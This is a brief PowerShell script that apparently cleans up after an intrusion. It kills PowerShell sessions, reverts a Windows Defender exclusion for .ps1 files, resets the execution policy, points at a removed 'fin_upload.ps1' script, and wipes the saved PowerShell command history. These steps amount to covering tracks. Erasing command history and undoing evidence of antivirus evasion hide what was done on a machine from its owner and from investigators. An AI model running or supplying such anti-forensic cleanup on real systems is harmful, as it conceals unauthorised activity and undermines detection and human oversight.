Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
Set-Location C:\Users\Public\
#Remove-Item fin_upload.ps1
Set-ExecutionPolicy restricted -Force 
Remove-MpPreference -ExclusionExtension ps1 -Force 
Clear-Content (Get-PSReadlineOption).HistorySavePath 
taskkill -F /IM powershell.exe 
